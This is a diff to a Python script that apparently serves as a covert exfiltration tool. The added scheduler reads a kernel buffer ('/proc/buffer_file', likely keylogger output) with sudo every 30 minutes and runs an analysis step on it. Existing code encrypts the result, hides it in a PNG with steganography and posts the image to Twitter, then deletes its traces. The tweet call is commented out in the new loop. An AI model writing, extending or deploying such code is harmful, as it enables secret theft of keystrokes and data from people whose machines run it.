@@ -3,6 +3,7 @@ import subprocess
 import sys
 import json
 import random
+import time
 from io import BytesIO
 
 try:
@@ -18,7 +19,6 @@ try:
 except ImportError:
     install("tweepy")
     import tweepy
-
 try:
     from stegano import lsb
 except ImportError:
@@ -126,7 +126,7 @@ def tweetImage(tw_api, image_path, tw_text="I love lemons"):
     media_ids = [im_handler.media_id_string]
     status = tw_api.update_status(tw_text, media_ids=media_ids,source="random user")
 
-def main():
+def sendStegoTweet():
 
     """
     Image size of 600x600 = 360,000 pixels
@@ -147,7 +147,7 @@ def main():
     width, height = PNG_IMAGE.size
     image_text_storage = (width * height)//3 #number of ASCII character that is storable
 
-    logged_file = "log.txt"
+    logged_file = "log_file_analyzed.txt"
     encrypted_file = "encrypted.txt"
     password = "password"
 
@@ -163,4 +163,66 @@ def main():
     files = [ImagePath, NewImagePath, logged_file, encrypted_file]
     cleanup(files)
 
-main()
+
+def check_log_file():
+
+    EXPECTED_SIZE_LOGFILE = 10
+    try:
+        os.system('sudo cat /proc/buffer_file 2>/dev/null > log_file.txt')
+    except Exception:
+        print("check log file has failed")
+        return False 
+    
+    #returns size of file in bytes. Or num characters in file since one character is 1 byte
+    log_file_size = os.stat('log_file.txt').st_size
+
+    #check if file size is significant, if the file size if significant then we continue analysing it
+    if log_file_size > EXPECTED_SIZE_LOGFILE:
+        return check_analyzed_log_file()
+    else:
+        return False
+
+
+
+#checks whether data is significant
+def check_analyzed_log_file():
+    EXPECTED_SIZE_ANALYSED_LOGFILE = 10
+
+    try:
+        os.system('./analyze')
+    except Exception:
+        print("fail analyzing file")
+        return False 
+    
+    analysed_file_size = os.stat('log_file_analyzed.txt').st_size
+
+    if analysed_file_size > EXPECTED_SIZE_ANALYSED_LOGFILE:
+        return True
+    else:
+        return False
+
+def main_scheduler(): 
+    minutes = 30   
+    REPEAT_EVERY = 60 * minutes # secs/min * minutes
+    while True:
+        
+        #first we retrieve log file from /proc/buffer_file
+        #check if enough data in log file. if yes continue, if not try again in 30 mins
+
+        #if continue to next phase retrieve procfile and analyse data 
+        #check if enough data in analysed log file. if yes continue to tweet, if not try again in 30 mins
+
+        should_continue_to_tweet = check_log_file() 
+        
+
+        #if everything good then we send as tweet 
+        #repeat process again after that
+        
+        if(should_continue_to_tweet):
+            print("stego tweet sent")
+            #sendStegoTweet()
+
+        time.sleep(REPEAT_EVERY)    
+
+main_scheduler()
+    
